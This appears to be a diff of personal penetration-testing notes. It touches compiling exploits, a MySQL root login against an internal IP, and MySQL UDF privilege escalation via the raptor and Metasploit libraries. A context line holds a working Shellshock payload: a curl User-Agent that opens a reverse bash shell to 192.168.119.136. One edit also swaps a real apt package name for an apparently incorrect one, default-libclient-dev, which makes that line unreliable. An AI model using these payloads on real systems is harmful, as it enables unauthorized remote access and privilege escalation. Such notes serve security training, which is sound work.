@@ -761,7 +761,7 @@ sudo apt-get install gcc
 *I installed some extra stuff*
 sudo apt-get install libsctp-dev
 
-sudo apt install default-libmysqlclient-dev default-libmysqld-dev
+sudo apt install default-libclient-dev default-libmysqld-dev
 After you've finished compiling, run "file <compiled file name>". Is the file shown as a 32 bit or 64 bit binary? If it's still 64 bit even after using the -m32 flag you can try "sudo apt install gcc-multilib". Then run gcc -m32 -Wl,--hash-style=both -o outputfile inputfile.c 
 
 ```
@@ -830,6 +830,7 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.136/443 0>&
 ```
 # MYSQL version 5
 ```bash
+mysql -u root -p -h 172.16.80.22 -P 3306
 It is vulnerable to raptor or another .so from rapid 7's Github.
 https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
 MYSQL does not have xp_cmdshell; But we can make one if it is vuln
